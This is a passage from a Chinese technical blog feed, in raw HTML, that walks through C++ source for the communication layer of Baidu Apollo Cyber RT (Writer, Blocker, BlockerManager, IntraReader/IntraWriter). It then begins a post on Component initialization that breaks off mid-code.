class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br>Writer&lt;MessageT&gt;::<span class="hljs-built_in">Writer</span>(<span class="hljs-type">const</span> proto::RoleAttributes&amp; role_attr)<br>    : <span class="hljs-built_in">WriterBase</span>(role_attr), <span class="hljs-built_in">transmitter_</span>(<span class="hljs-literal">nullptr</span>), <span class="hljs-built_in">channel_manager_</span>(<span class="hljs-literal">nullptr</span>) &#123;&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-type">bool</span> Writer&lt;MessageT&gt;::<span class="hljs-built_in">Init</span>() &#123;<br>   <span class="hljs-comment">/*  ....   */</span><br>    transmitter_ =<br>        transport::Transport::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">CreateTransmitter</span>&lt;MessageT&gt;(role_attr_);<br>    <span class="hljs-comment">/*  ....  */</span><br>  <span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">set_id</span>(transmitter_-&gt;<span class="hljs-built_in">id</span>().<span class="hljs-built_in">HashValue</span>());<br>  channel_manager_ =<br>      service_discovery::TopologyManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">channel_manager</span>();<br>  <span class="hljs-built_in">JoinTheTopology</span>();<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code> Writer</code> 类的主要功能想必大家也猜得到：向对应的信道写数据，其 <code>Write()</code> 函数会调用 <code>transport::Transmitter-&gt;Transmit()</code> 函数，每个 <code>Writer</code> 只能向一个信道写东西，但一个信道可以有多个 <code>Writer</code> 对象。</p><h3 id="Blocker——缓存者">Blocker——缓存者</h3><p><code>Blocker</code> 类是 <code>Reader</code> 的一个成员，它继承自 <code>BlockerBase</code> 类，还是和之前一样，我们先来看一下 <code>Blocker</code> 类的组成。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Blocker</span> : <span class="hljs-keyword">public</span> BlockerBase &#123; <br>  BlockerAttr attr_;<span class="hljs-comment">// Blocker的配置属性</span><br>  MessageQueue observed_msg_queue_;<span class="hljs-comment">// 观察队列</span><br>  MessageQueue published_msg_queue_;<span class="hljs-comment">// 发布队列</span><br><br>  CallbackMap published_callbacks_;<span class="hljs-comment">// id 与 回调函数的表 其实就是 unordered_map</span><br>  MessageType dummy_msg_;<span class="hljs-comment">// 假消息 常用于空值返回</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>前面我提到，<code>Reader</code> 类中有成员 <code>Blocker</code> ，用于缓存消息，因此有一个发布队列。当调用 <code>Blocker::Enqueue()</code> 函数时，<code>Blocker</code> 会将得到的新消息推入到队首，当队列已满时，就自动把队尾的旧消息移除。而为了用户能观察到队列中的消息，<code>Blocker</code> 类又加上了一个观察队列。当调用 <code>Blocker::Observe()</code> 时，就将发布队列拷贝一份给了观察队列。</p><p>对于每一个 <code>Blocker</code> 类，它保存了一张 <code>callback_id</code> 和回调函数指针的一一对应关系表 <code>published_callbacks_</code>，记录了其所在 <code>Reader</code> 对象的一些回调函数。之所以是<strong>一些</strong>，是因为 <code>Blocker</code> 的主要功能应该是提供一个管理者获取数据的入口，方便调试、记录日志、运行模拟环境和监控整个系统，所以在 <code>Blocker</code> 类里注册的回调函数应该都是管理员注册的监控函数，和系统主逻辑没关系<sup>3</sup>😅。<em>其实在<strong>真实模式</strong>下，主逻辑完全都没有到过这里，这是我花了很多时间反复确认的。</em></p><p>好，这时候结合 <code>Reader</code> 类的部分内容，就可以更好地理解 <code>Blocker</code> 类的作用了。<code>Reader</code> 类调用 <code>Enqueue()</code> 函数时，先更新时间参数，再调用 <code>Blocker::Publish()</code> 函数，其中 <code>Enqueue()</code> 将消息推入到发布队列中，然后 <code>Notify()</code> 函数用 <code>published_callbacks_</code> 内的所有的回调函数去处理消息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-type">void</span> Blocker&lt;T&gt;::<span class="hljs-built_in">Publish</span>(<span class="hljs-type">const</span> MessagePtr&amp; msg) &#123;<br>  <span class="hljs-built_in">Enqueue</span>(msg);<br>  <span class="hljs-built_in">Notify</span>(msg);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 <code>Publish()</code> 函数非常重要，在讨论下文的 <code>BlockerManager</code> 会用到。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-type">void</span> Blocker&lt;T&gt;::<span class="hljs-built_in">Enqueue</span>(<span class="hljs-type">const</span> MessagePtr&amp; msg) &#123;<br>  <span class="hljs-comment">/*  ....  */</span><br>  published_msg_queue_.<span class="hljs-built_in">push_front</span>(msg);<br>  <span class="hljs-keyword">while</span> (published_msg_queue_.<span class="hljs-built_in">size</span>() &gt; attr_.capacity)<br>    published_msg_queue_.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-type">void</span> Blocker&lt;T&gt;::<span class="hljs-built_in">Notify</span>(<span class="hljs-type">const</span> MessagePtr&amp; msg) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : published_callbacks_)<br>    item.<span class="hljs-built_in">second</span>(msg);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么 <code>published_callbacks_</code> 是如何得到的呢？答案是，通过 <code>Subscribe()</code> 函数加入的。只需要调用 <code>Blocker::Subscribe()</code> 函数，就可以将回调函数 id 和回调函数指针一同放入到这张表中。</p><h4 id="BlockerManager——模拟模式助手">BlockerManager——模拟模式助手</h4><p>好，接下来我们将目光暂时转移到模拟模式下。先再次介绍一下 <code>IntraReader</code> 类与 <code>IntraWriter</code> 类。它们俩都是在<strong>模拟模式</strong>下才会出现的对象。代码文件位于 <code>cyber/blocker/intra_reader.h</code> 和 <code>cyber/bolcker/intra_writer.h</code>，它们的实现与 <code>BlockerManager</code> 类关系密切，这也是为何它们的代码文件会位于 <code>cyber/blocker</code> 而不是和 <code>Reader</code> 一样位于 <code>cyber/node</code> 的重要原因（也是为什么我选择在这里讲它们俩的原因😅）。它们分别继承自 <code>Reader</code> 和 <code>Writer</code> 。因为这是模拟模式下创建的对象，所以它们不会去创建协程，去获取传感器的数据。</p><p>老规矩，我们先看看 <code>IntraReader</code> 和 <code>IntraWriter</code> “肚子里有什么东西&quot;👇。看来货不多，<code>IntraReader</code> 类只有一个回调函数，<code>IntraWriter</code> 类只有个 <code>BlockerManager</code> 类的指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IntraReader</span> : <span class="hljs-keyword">public</span> apollo::cyber::Reader&lt;MessageT&gt; &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">IntraReader</span>(<span class="hljs-type">const</span> proto::RoleAttributes&amp; attr, <span class="hljs-type">const</span> Callback&amp; callback);<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(<span class="hljs-type">const</span> std::shared_ptr&lt;MessageT&gt;&amp; msg)</span> <span class="hljs-keyword">override</span></span>;<br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">OnMessage</span><span class="hljs-params">(<span class="hljs-type">const</span> MessagePtr&amp; msg_ptr)</span></span>;<br>  Callback msg_callback_;<br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IntraWriter</span> : <span class="hljs-keyword">public</span> apollo::cyber::Writer&lt;MessageT&gt; &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">IntraWriter</span><span class="hljs-params">(<span class="hljs-type">const</span> proto::RoleAttributes&amp; attr)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Init</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Write</span><span class="hljs-params">(<span class="hljs-type">const</span> MessagePtr&amp; msg_ptr)</span> <span class="hljs-keyword">override</span></span>;<br> <span class="hljs-keyword">private</span>:<br>  BlockerManagerPtr blocker_manager_;<br>&#125;;<br></code></pre></td></tr></table></figure><p>再来看看为什么称 <code>BlockerManager</code> 为模拟模式的助手。因为 <code>IntraReader</code> 和 <code>IntraWriter</code> 都或多或少与它有点关系。看看它们的初始化，<code>IntraReader</code> 类重载了 <code>Reader::Init()</code> 函数。在初始化中，它不会创建协程，而是直接调用 <code>BlockerManager::Subscribe()</code>，把 <code>IntraReader::OnMessage()</code> 函数（记录时间并调用 <code>IntraReader</code> 创建时传入的回调函数）注册为该信道对应 <code>Blocker</code> 的回调函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">BlockerManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">Subscribe</span>&lt;MessageT&gt;(<br>      <span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">channel_name</span>(), <span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">qos_profile</span>().<span class="hljs-built_in">depth</span>(),<br>      <span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">node_name</span>(),<br>      std::<span class="hljs-built_in">bind</span>(&amp;IntraReader&lt;MessageT&gt;::OnMessage, <span class="hljs-keyword">this</span>,<br>                std::placeholders::_1));<br></code></pre></td></tr></table></figure><p>对于 <code>IntraWriter</code> 类，就更直接了，在初始化时它直接用 <code>BlockManager</code> 创建了一个 <code>Blocker</code> 对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> MessageT&gt;<br><span class="hljs-type">bool</span> IntraWriter&lt;MessageT&gt;::<span class="hljs-built_in">Init</span>() &#123;<br>    blocker_manager_ = BlockerManager::<span class="hljs-built_in">Instance</span>();<br>    blocker_manager_-&gt;<span class="hljs-built_in">GetOrCreateBlocker</span>&lt;MessageT&gt;(<br>        <span class="hljs-built_in">BlockerAttr</span>(<span class="hljs-keyword">this</span>-&gt;role_attr_.<span class="hljs-built_in">channel_name</span>()));<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>BlockerManager</code> 类（单例模式）在模拟模式下发挥了非常大的作用！还是老样子，看看它有什么东西，哦，只有一个 <code>BlockerMap</code> ，它将信道名字与对应 <code>Blocker</code> 记录了下来。 <code>IntraReader::Enqueue()</code> 和 <code>IntraWriter::Write()</code> 都调用了 <code>BlockerManager::Publish()</code> 函数</p><p>再来看看它们工作时会怎么干吧。先来看一下 <code>IntraReader::Enqueue()</code> 函数，它会调用 <code>BlockerManager::Publish()</code> 函数，<code>IntraReader::Observe()</code> 函数也是从 <code>BlockerManager</code> 中取出一个 <code>Blocker</code> 对象，后调用 <code>Observe()</code> 。对于 <code>IntraWriter</code> 类，其 <code>Write()</code> 函数也是直接调用 <code>BlockerManager::Publish()</code> 函数来放入数据，而 <code>BlockerManager::Publish()</code> 函数👇会先选取（或构造）出对应信道的 <code>Blocker</code> 对象，然后调用 <code>Blocker::Publish()</code> 函数，这个函数我在前文已经讨论过了，<code>Blocker::Publish()</code> 函数会先调用 <code>Enqueue()</code> 将消息推入到发布队列中，然后 <code>Notify()</code> 函数通知 <code>published_callbacks_</code> 内的所有的回调函数去处理消息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockerManager</span> &#123;<br>  <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">const</span> std::shared_ptr&lt;BlockerManager&gt;&amp; <span class="hljs-title">Instance</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> instance =<br>        std::<span class="hljs-built_in">shared_ptr</span>&lt;BlockerManager&gt;(<span class="hljs-keyword">new</span> <span class="hljs-built_in">BlockerManager</span>());<br>    <span class="hljs-keyword">return</span> instance;<br>  &#125;<br> <span class="hljs-keyword">private</span>:<br>  BlockerMap blockers_;<br>  std::mutex blocker_mutex_;<br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">BlockerManager::Publish</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; channel_name,</span></span><br><span class="hljs-params"><span class="hljs-function">                             <span class="hljs-type">const</span> <span class="hljs-keyword">typename</span> Blocker&lt;T&gt;::MessagePtr&amp; msg)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> blocker = <span class="hljs-built_in">GetOrCreateBlocker</span>&lt;T&gt;(<span class="hljs-built_in">BlockerAttr</span>(channel_name));<br>  blocker-&gt;<span class="hljs-built_in">Publish</span>(msg);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="小结">小结</h2><p>在这篇博客中，我先介绍了一下 Cyber RT 的通信架构和三种通信模型，然后，开始一层层地介绍涉及到通信的类。在下篇博客中，我会将剩下的东西介绍清楚，最后我会给出一个更加完整的总结。</p><h2 id="参考">参考</h2><p>[1] <a href="https://github.com/daohu527/Dig-into-Apollo/tree/master/cyber">Dig into Apollo - Cyber</a></p><p>[2] <a href="https://blog.csdn.net/jinzhuojun/article/details/108066714">自动驾驶平台Apollo 5.5阅读手记：Cyber RT中的通信传输</a></p><p>[3] <a href="https://blog.csdn.net/qq_25762163/article/details/103803032">百度Apollo系统学习-Cyber RT 通信-上层</a></p><p>[4] <a href="https://blog.csdn.net/kesalin/article/details/88914029">百度 Apollo Cyber RT简介、基本概念以及与 ROS 对照</a></p><p>[5] <a href="https://blog.csdn.net/qq_25762163/article/details/103895527">百度Apollo系统学习-Cyber RT 通信-底层</a></p><p>[6] <a href="https://cyber-rt.readthedocs.io/en/latest/api/cppapi.html#cyber-node-reader-h">cyber-rt.readthedocs.io</a></p><p>[7] 自动驾驶汽车平台技术基础/杨世春等编著. —北京：清华大学出版社</p>]]></content>
    
    
    <categories>
      
      <category>Apollo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apollo</tag>
      
      <tag>Cyber RT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apollo Cyber RT 组件</title>
    <link href="/2020/10/25/2020-10-25-CyberComponent/"/>
    <url>/2020/10/25/2020-10-25-CyberComponent/</url>
    
    <content type="html"><![CDATA[<h1>Apollo Cyber RT 组件</h1><h2 id="前言">前言</h2><p>今天，我来给大家介绍一下 Apollo Cyber RT 中组件（Component）的相关知识。老规矩，在这之前，先回顾一下之前的内容。根据课题组的安排，我这段时间一直在研究 <a href="https://apollo.auto/">Apollo</a> 系统，它是百度开发的自动驾驶开源框架，具有高性能和高灵活性的特点，我主要介绍 <a href="https://github.com/ApolloAuto/apollo">Apollo 5.5</a> 版本。其中的 Apollo Cyber RT 是 Apollo 团队在注意到 ROS 无法满足自动驾驶系统的鲁棒性和性能要求后，专门为自动驾驶场景设计的开源、高性能<strong>运行时框架</strong>。在<a href="https://dingfen.github.io/apollo/2020/10/21/CyberTimer.html">之前的博客中</a>，我介绍了 Cyber RT 中定时器的相关知识，主要介绍了定时器的算法、实现以及定时器组件如何使用定时器。由此引发了我对组件实现的兴趣，那么这篇博客就详细地介绍一下组件吧。</p><h2 id="组件-Component">组件 Component</h2><p>根据百度 Apollo 团队提供的 Cyber RT 文档<sup>1</sup>，<strong>组件</strong>（Component）是 Cyber RT 用于构建应用模块的基本类。每个特定的应用模块都可以继承 <code>Component</code> 类并定义自己的函数 <code>Init()</code> 和 <code>Proc()</code> ，之后，该模块就可以被装载入 Cyber RT 框架中。</p><p>一般来说，用户有两种选择来使用 Cyber RT 框架：</p><ul><li>基于二进制。应用被分别编译成二进制文件，并使用自己创建的 <code>Reader</code> 和 <code>Writer</code> 来与其他 Cyber RT 模块进行通信</li><li>基于组件。应用被编译成一个共享库（Shared library），通过继承 <code>Component</code> 类并写好相应的 dag 文件，Cyber RT 框架会自动装载并运行该应用</li></ul><p>不难看出，使用基于组件的方案有明显的优点：</p><ul><li>组件可以被不同的进程装载，部署非常灵活</li><li>当需要改变接受信道的名字（或者其他属性），可以直接更改 dag 文件，不需要重新编译</li><li>组件支持接收多种类型的数据</li><li>组件支持提供多种混合策略</li></ul><h3 id="用户自定义组件">用户自定义组件</h3><p>要创建并启动一个算法组件<sup>2</sup>，需要通过以下 4 个步骤：</p><ul><li>初如化组件的文件结构</li><li>实现组件类</li><li>设置配置文件</li><li>启动组件</li></ul><p>官方文档介绍的很详细，在这里我就不啰嗦了。</p><h2 id="组件类">组件类</h2><p>在开始前，为更方便大家的理解，建议阅读 <a href="https://dingfen.github.io/apollo/2020/10/14/apollo-intro.html">Cyber RT 的术语解释</a> 和 <a href="https://cyber-rt.readthedocs.io/en/latest/CyberRT_Terms.html">Cyber RT Terms</a> ，因为我会反复提到其中的某些术语。</p><p>从代码上看，组件基类 <code>ComponentBase</code> 是组件类 <code>Component</code> 和时间组件类 <code>TimerComponent</code> 的基类。仔细看下图（淡蓝色为背景表示它是 <code>private</code> 或 <code>protected</code> 的），有几点发现：</p><center><img src="/img/Component.png" /></center><ul><li>一个 <code>Component</code> 类只含有一个 <code>Node</code> ，但可以有多个 <code>Reader</code></li><li><code>Init()</code> 和 <code>Proc()</code> 这两个用户自己定义的函数，都是不可以被直接调用的</li><li>用户只能使用 <code>Initialize()</code> 和 <code>Process()</code> 函数来调用自己写的 <code>Init()</code> 和 <code>Proc()</code></li></ul><p>根据代码，<code>Component</code> 类最多可以处理 4 个<strong>消息信道</strong>（ channels of messages），这些信道——即 <code>Reader</code> 对象，最后都会被放入到 <code>ComponentBase::readers_</code> 变量中，没错，这些所谓的信道在代码实现中就是 <strong>Reader</strong> ，Apollo 团队并没有设计出 <code>Channel</code> 这样的类🐶。</p><p>先从简单的 <code>Process()</code> 函数抓起吧。<code>Process()</code> 非常好理解，就是先判断一下有没有关闭该 <code>Component</code> 类，再调用 <code>Proc()</code> 函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M0, <span class="hljs-keyword">typename</span> M1&gt;<br><span class="hljs-type">bool</span> Component&lt;M0, M1, NullType, NullType&gt;::<span class="hljs-built_in">Process</span>(<br>    <span class="hljs-type">const</span> std::shared_ptr&lt;M0&gt;&amp; msg0, <span class="hljs-type">const</span> std::shared_ptr&lt;M1&gt;&amp; msg1) &#123;<br>  <span class="hljs-keyword">if</span> (is_shutdown_.<span class="hljs-built_in">load</span>())<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Proc</span>(msg0, msg1);<br>&#125;<br></code></pre></td></tr></table></figure><p>我最关心的就是 <code>Component</code> 类的初始化过程，即 <code>Initialize()</code> 函数，一旦搞清楚了这一点，那么我们就可以更好地理解其他 Cyber RT 部分在整个系统中的作用。经过对代码的详细了解后，我总结出了以下过程：</p><ol><li>创建 <code>Node</code>  节点</li><li>读取配置文件</li><li>调用用户定义的函数 <code>Init()</code></li><li>创建信道对象，或者说读者 <code>Reader&lt;M&gt;&gt;</code><ol><li>根据配置文件的相关内容，填充信道的相关配置信息 <code>reader_cfg</code></li><li>创建消息收到时，就会触发的<strong>激活函数</strong> <code>invoke func</code></li><li>如果 <code>is_reality_mode</code> 为真 ，那么直接根据配置信息 <code>reader_cfg</code> 创建信道，不加入激活函数；若不是，需要再加入<code>invoke func</code> 创建信道</li></ol></li><li>当 <code>is_reality_mode</code> 为真，那么就需要创建数据访问类 <code>DataVisitor</code> 、 协程工厂、调度器，并创建调度任务。</li></ol><p>看完我的语言描述后，我觉得是时候上代码给你们看一下它的真面目了。为确保代码简单而又不失一般性，我选择了一个<strong>含有两个信道</strong>的 <code>Component</code> 类初始化函数。这部分代码非常重要，后文我们会反复使用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> M0, <span class="hljs-keyword">typename</span> M1&gt;<span class="hljs-comment">// 消息的类型 表示 这里有两个信道</span><br><span class="hljs-type">bool</span> Component&lt;M0, M1, NullType, NullType&gt;::<span class="hljs-built_in">Initialize</span>(<span class="hljs-type">const</span> ComponentConfig&amp; config) &#123;<br>  <span class="hljs-comment">// 1. 创建 Node 节点</span><br>  node_.<span class="hljs-built_in">reset</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(config.<span class="hljs-built_in">name</span>()));<br>  <span class="hljs-comment">// 2. 读取配置文件</span><br>  <span class="hljs-built_in">LoadConfigFiles</span>(config);<br>  <span class="hljs-keyword">if</span> (config.<span class="hljs-built_in">readers_size</span>() &lt; <span class="hljs-number">2</span>)<br>    <span class="hljs-comment">/* 错误处理  */</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Init</span>())<br>        <span class="hljs-comment">/* 错误处理  */</span><br>  <span class="hljs-type">bool</span> is_reality_mode = GlobalData::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">IsRealityMode</span>();<br>  <span class="hljs-comment">//  信道的配置信息</span><br>  ReaderConfig reader_cfg;<br>  reader_cfg.channel_name = config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">channel</span>();<br>  reader_cfg.qos_profile.<span class="hljs-built_in">CopyFrom</span>(config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">qos_profile</span>());<br>  reader_cfg.pending_queue_size = config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">pending_queue_size</span>();<br>  <span class="hljs-comment">// 第 1 个 读信道已经创建</span><br>  <span class="hljs-keyword">auto</span> reader1 = node_-&gt;<span class="hljs-keyword">template</span> <span class="hljs-built_in">CreateReader</span>&lt;M1&gt;(reader_cfg);<br>    <br>  reader_cfg.channel_name = config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">channel</span>();<br>  reader_cfg.qos_profile.<span class="hljs-built_in">CopyFrom</span>(config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">qos_profile</span>());<br>  reader_cfg.pending_queue_size = config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">pending_queue_size</span>();<br>  <span class="hljs-comment">// 第 0 个读信道要根据是否 is_reality_mode   来决定使用何种函数创建</span><br>  std::shared_ptr&lt;Reader&lt;M0&gt;&gt; reader0 = <span class="hljs-literal">nullptr</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">cyber_likely</span>(is_reality_mode)) &#123;<br>    reader0 = node_-&gt;<span class="hljs-keyword">template</span> <span class="hljs-built_in">CreateReader</span>&lt;M0&gt;(reader_cfg);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    std::weak_ptr&lt;Component&lt;M0, M1&gt;&gt; self =<br>        std::dynamic_pointer_cast&lt;Component&lt;M0, M1&gt;&gt;(<span class="hljs-built_in">shared_from_this</span>());<br><br>    <span class="hljs-keyword">auto</span> blocker1 = blocker::BlockerManager::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">GetBlocker</span>&lt;M1&gt;(<br>        config.<span class="hljs-built_in">readers</span>(<span class="hljs-number">1</span>).<span class="hljs-built_in">channel</span>());<br><br>    <span class="hljs-keyword">auto</span> func = [self, blocker1](<span class="hljs-type">const</span> std::shared_ptr&lt;M0&gt;&amp; msg0) &#123;<br>      <span class="hljs-keyword">auto</span> ptr = self.<span class="hljs-built_in">lock</span>();<br>      <span class="hljs-keyword">if</span> (ptr) &#123;<br>        <span class="hljs-keyword">if</span> (!blocker1-&gt;<span class="hljs-built_in">IsPublishedEmpty</span>()) &#123;<br>          <span class="hljs-keyword">auto</span> msg1 = blocker1-&gt;<span class="hljs-built_in">GetLatestPublishedPtr</span>();<br>          ptr-&gt;<span class="hljs-built_in">Process</span>(msg0, msg1);<br>        &#125;<br>      &#125; <span class="hljs-keyword">else</span><br>           <span class="hljs-comment">/*   错误处理   */</span><br>    &#125;;<br>    reader0 = node_-&gt;<span class="hljs-keyword">template</span> <span class="hljs-built_in">CreateReader</span>&lt;M0&gt;(reader_cfg, func);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (reader0 == <span class="hljs-literal">nullptr</span> || reader1 == <span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-comment">/*  错误处理  */</span><br>  <span class="hljs-comment">// 信道创建完毕，全部存入到 readers_ 数组中</span><br>  readers_.<span class="hljs-built_in">push_back</span>(std::<span class="hljs-built_in">move</span>(reader0));<br>  readers_.<span class="hljs-built_in">push_back</span>(std::<span class="hljs-built_in">move</span>(reader1));<br>    <br>  <span class="hljs-keyword">if</span> (<span 